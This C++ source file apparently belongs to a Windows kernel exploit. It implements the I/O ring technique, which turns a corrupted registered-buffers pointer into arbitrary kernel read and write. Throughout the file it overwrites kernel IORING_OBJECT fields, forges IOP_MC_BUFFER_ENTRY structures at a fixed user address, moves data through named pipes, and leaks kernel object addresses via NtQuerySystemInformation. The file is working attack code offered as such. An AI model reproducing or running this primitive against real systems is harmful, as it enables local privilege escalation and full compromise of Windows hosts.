
#include "win_defs.h"

#include "ioring.h"

#include <cstdint>
#include <ntstatus.h>
#include <ioringapi.h>
#include <spdlog/spdlog.h>
#include <thread>


#include "kernel.h"

// could create an ioring class but i am not really bothered
namespace collat {
		ioring::ioring(LPCSTR InputPipeName, LPCSTR OutputPipeName) {
			_input_pipe_name = InputPipeName;
			_output_pipe_name = OutputPipeName;
			_ioring_object = create();
		}

		ioring::~ioring() {
			cleanup();

			/*if (_ioring_handle != INVALID_HANDLE_VALUE)
				CloseIoRing(_ioring_handle);

			//if (_fake_reg_buffers)
			//	VirtualFree(_fake_reg_buffers, _fake_reg_buffers_size, MEM_RELEASE);

			if (_in_pipe_client != INVALID_HANDLE_VALUE)
				CloseHandle(_in_pipe_client);

			if (_out_pipe_client != INVALID_HANDLE_VALUE)
				CloseHandle(_out_pipe_client);

			if (_in_pipe != INVALID_HANDLE_VALUE) {
				DisconnectNamedPipe(_in_pipe);
				CloseHandle(_in_pipe);
			}

			if (_out_pipe != INVALID_HANDLE_VALUE) {
				DisconnectNamedPipe(_out_pipe);
				CloseHandle(_out_pipe);
			}*/

		}

		void ioring::cleanup() {
			char null[0x10] = { 0 };
			raw_write<char[0x10]>((uint64_t)&_ioring_object->RegBuffersCount, &null);
		}

		void ioring::testthread() {
			char zeroBuf[0x20];
			memset(zeroBuf, 0, sizeof(zeroBuf));
			spdlog::debug("fixing event pointers...");
			raw_write<char[0x20]>((uint64_t)_ioring_object + 0x90, &zeroBuf);
			spdlog::debug("successfully fixed event pointers!");
			testwrite = true;
		}

		bool ioring::init_exploit(uint32_t FakeRegBufferCount) {
			if (!_ioring_object) {
				spdlog::error("no ioring object!");
				return false;
			}

			_fake_reg_buffers_size = sizeof(uint64_t) * FakeRegBufferCount;

			spdlog::debug("overwriting kernel-mode reg buffs pointer...");
			kernel::do_write((uint64_t)_ioring_object + 0x9d);
			spdlog::debug("successfully overwritten reg buffs pointer!");

			spdlog::debug("zeroing user-mode reg buffs");
			_fake_reg_buffers = (uint64_t*)0x65007500;
			memset(_fake_reg_buffers, 0, _fake_reg_buffers_size);

			

			_HIORING* phIoRing = *(_HIORING**)&_ioring_handle;
			phIoRing->RegBufferArray = _fake_reg_buffers;
			phIoRing->BufferArraySize = FakeRegBufferCount;

			char zeroBuf[0x20];
			memset(zeroBuf, 0, sizeof(zeroBuf));
			spdlog::debug("fixing event pointers...");
			internal_write((uint64_t)_ioring_object + 0x90, &zeroBuf, 0x20);
			spdlog::debug("successfully fixed event pointers!");


			

			return true;

		}

		PIORING_OBJECT ioring::create() {
			IORING_CREATE_FLAGS ioRingFlags;
			ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
			ioRingFlags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

			int status = CreateIoRing(IORING_VERSION_3,
				ioRingFlags,
				0x10000,
				0x20000,
				&_ioring_handle);

			if (status != 0) {
				spdlog::error("failed to create new ioring! status: {}", status);
				return 0;
			}

			spdlog::debug("ioring handle: {:#x}", (uint64_t)*(PHANDLE)_ioring_handle);

			auto ioring = get_object<PIORING_OBJECT>(GetCurrentProcessId(), *(PHANDLE)_ioring_handle);
			spdlog::debug("ioring pointer: {:#x}", (uint64_t)ioring);

			_in_pipe = CreateNamedPipeA(_input_pipe_name, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x100000, 0x100000, 0, NULL);
			_out_pipe = CreateNamedPipeA(_output_pipe_name, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x100000, 0x100000, 0, NULL);

			if (_in_pipe == INVALID_HANDLE_VALUE || _out_pipe == INVALID_HANDLE_VALUE) {
				spdlog::error("failed to create ioring pipes!");
				return 0;
			}

			_in_pipe_client = CreateFileA(_input_pipe_name,
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);

			_out_pipe_client = CreateFileA(_output_pipe_name,
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);

			if (_in_pipe_client == INVALID_HANDLE_VALUE || _out_pipe_client == INVALID_HANDLE_VALUE) {
				spdlog::error("failed to open ioring pipe files!\n");
				return 0;
			}

			return ioring;
		}

		bool ioring::internal_write(uint64_t address, void* data, size_t len) {
			//spdlog::debug("[ioring::internal_write] writing to {} bytes from {} to {}", len, data, (void*)address);

			PIOP_MC_BUFFER_ENTRY pMcBufferEntry = nullptr;
			IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(_in_pipe_client);
			IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
			IORING_CQE cqe = { 0 };
			bool res = false;

			SetFilePointer(_in_pipe, 0, NULL, FILE_BEGIN);
			//spdlog::debug("[ioring::internal_write] writing data to pipe");
			if (WriteFile(_in_pipe, data, len, NULL, NULL) == 0)
				goto done;

			//spdlog::debug("[ioring::internal_write] successfully written data to pipe");

			//FlushFileBuffers(_in_pipe);
			//spdlog::debug("[ioring::internal_write] pipe buffers flushed");
			SetFilePointer(_in_pipe, 0, NULL, FILE_BEGIN);
			//spdlog::debug("[ioring::internal_write] pipe file pointer set to beginning");
			pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
			//spdlog::debug("[ioring::internal_write] allocated buffer entry");
			if (!pMcBufferEntry)
				goto done;

			pMcBufferEntry->Address = (PVOID)address;
			pMcBufferEntry->Length = len;
			pMcBufferEntry->Type = 0xc02;
			pMcBufferEntry->Size = 0x80;
			pMcBufferEntry->AccessMode = 1;
			pMcBufferEntry->ReferenceCount = 1;

			_fake_reg_buffers[0] = (uint64_t)pMcBufferEntry;
			//spdlog::debug("[ioring::internal_write] set fake reg buffer");

			SetFilePointer(_in_pipe_client, 0, NULL, FILE_BEGIN);
			//spdlog::debug("[ioring::internal_write] building ioring read file");
			if (BuildIoRingReadFile(_ioring_handle, reqFile, reqBuffer, len, 0, NULL, IOSQE_FLAGS_NONE) != 0)
				goto done;

			//spdlog::debug("[ioring::internal_write] built ioring read file");

			if (SubmitIoRing(_ioring_handle, 0, 0, NULL) != 0)
				goto done;

			//spdlog::debug("[ioring::internal_write] ioring submitted");
			if (PopIoRingCompletion(_ioring_handle, &cqe) != 0)
				goto done;

			//spdlog::debug("[ioring::internal_write] ioring popped");
			if (cqe.ResultCode != 0)
				goto done;

			res = true;

		done:
			if (pMcBufferEntry != nullptr)
				VirtualFree(pMcBufferEntry, 0, MEM_RELEASE);

			return res;
		}


		

		void ioring::raw_read_internal(void* address, void* out, size_t size) {
			//spdlog::debug("[ioring::raw_read_internal] reading {} bytes from {} to {}", size, address, out);
			SetFilePointer(_out_pipe_client, 0, NULL, FILE_BEGIN);
			//spdlog::debug("[ioring::raw_read_internal] set pipe file ptr to beginning");
			PIOP_MC_BUFFER_ENTRY pMcBufferEntry = nullptr;
			//spdlog::debug("flushing client");
			//FlushFileBuffers(_out_pipe_client);
			//spdlog::debug("done");
			IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(_out_pipe_client);
			IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
			IORING_CQE cqe = { 0 };

			void* res = NULL;
			//void* buffer = nullptr;

			pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
			//spdlog::debug("[ioring::raw_read_internal] allocated buffer entry");
			if (!pMcBufferEntry)
				goto done;

			pMcBufferEntry->Address = address;
			pMcBufferEntry->Length = size;
			pMcBufferEntry->Type = 0xc02;
			pMcBufferEntry->Size = 0x80;
			pMcBufferEntry->AccessMode = 1;
			pMcBufferEntry->ReferenceCount = 1;

			_fake_reg_buffers[0] = (uint64_t)pMcBufferEntry;

			//spdlog::debug("[ioring::raw_read_internal] building ioring write file");
			if (BuildIoRingWriteFile(_ioring_handle, reqFile, reqBuffer, size, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE) != 0)
				goto done;
			//spdlog::debug("[ioring::raw_read_internal] successfully built ioring write file");

			if (SubmitIoRing(_ioring_handle, 0, 0, NULL) != 0)
				goto done;
			//spdlog::debug("[ioring::raw_read_internal] ioring submitted");

			if (PopIoRingCompletion(_ioring_handle, &cqe) != 0)
				goto done;
			//spdlog::debug("[ioring::raw_read_internal] ioring popped");

			if (cqe.ResultCode != 0)
				goto done;

			//buffer = calloc(1, size);/

			SetFilePointer(_out_pipe, 0, NULL, FILE_BEGIN);
			//spdlog::debug("[ioring::raw_read_internal] reset pipe file pointer");
			if (ReadFile(_out_pipe, out, size, NULL, NULL) == 0)
				goto done;

			//spdlog::debug("[ioring::raw_read_internal] successfully read from pipe");

			//spdlog::debug("flushing nclient");
			//FlushFileBuffers(_out_pipe);
			//spdlog::debug("[ioring::raw_read_internal] pipe flushed");


		done:
			if (pMcBufferEntry)
				VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);

			//if(buffer)
			//	memcpy(out, buffer, size);
		}

		// should really be in the kernel namespace but i cannot be fucked with c++ and its linker tantrums
		void* get_object_intrnl(uint32_t processId, HANDLE objectHandle) {
			PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
			NTSTATUS status = STATUS_SUCCESS;
			ULONG ulBytes = 0;
			void* objPtr = nullptr;

			while ((status = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH) {
				if (pHandleInfo != NULL) {
					pHandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes));
				}
				else {
					pHandleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes));
				}
			}

			if (status != STATUS_SUCCESS) {
				goto done;
			}

			for (size_t i = 0; i < pHandleInfo->NumberOfHandles; i++) {
				auto handle = pHandleInfo->Handles[i];
				if (handle.UniqueProcessId == processId && handle.HandleValue == reinterpret_cast<uint16_t>(objectHandle)) {
					objPtr = reinterpret_cast<void*>(handle.Object);
					break;
				}
			}

		done:
			if (pHandleInfo != NULL) {
				HeapFree(GetProcessHeap(), 0, pHandleInfo);
			}
			return objPtr;
		}
	
}